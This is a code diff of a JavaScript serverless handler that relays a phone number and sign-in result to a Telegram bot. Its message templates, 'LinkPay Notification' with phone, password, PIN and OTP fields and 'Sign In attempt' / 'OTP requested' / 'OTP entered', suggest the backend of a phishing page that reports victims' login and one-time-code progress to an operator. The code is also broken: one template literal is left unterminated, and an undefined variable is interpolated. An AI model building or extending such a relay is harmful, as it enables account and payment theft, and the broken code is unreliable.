@@ -5,35 +5,34 @@ export default async function handler(req, res) {
     });
   }
 
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-
-  if (!token || !chatId) {
-    return res.status(500).json({
-      error: "Telegram not configured"
-    });
-  }
-
-  const phone = req.body?.phone || "";
-  const result = req.body?.result || "Action received";
-
-  const  Phone = phone
-    ? String(phone).replace(
-        /^(\+?\d{2})\d+(\d{2})$/,
-        "1111111"
-      )
-    : "111111";
-
-  const message =
-    `🔔 LinkPay Notification
-
-📱 Phone: +9111111110
-🔑 Password: ********
-🔢 PIN: ****
-🔐 OTP: ******
-✅ Status: OTP requested
-
   try {
+    const { phone, result } = req.body || {};
+
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!token || !chatId) {
+      return res.status(500).json({
+        error: "Telegram not configured"
+      });
+    }
+
+    const safePhone = phone
+      ? String(phone).replace(
+          /^(\+?\d{2})\d+(\d{2})$/,
+          "$111111$2"
+        )
+      : "provided";
+
+    const message =
+      `🔐 Sign In attempt\n\n` +
+      `📱 Phone: ${Phone}\n\n` +
+      `🔒 OTP requested\n` +
+      `📱 Phone: ${Phone}\n\n` +
+      `🔑 OTP\n` +
+      `📱 Phone: ${Phone}\n\n` +
+      `✅ Result: ${result || "OTP entered"}`;
+
     const response = await fetch(
       `https://api.telegram.org/bot${token}/sendMessage`,
       {
@@ -49,8 +48,11 @@ export default async function handler(req, res) {
     );
 
     if (!response.ok) {
+      const errorText = await response.text();
+
       return res.status(500).json({
-        error: "Telegram request failed"
+        error: "Telegram request failed",
+        details: errorText
       });
     }
 
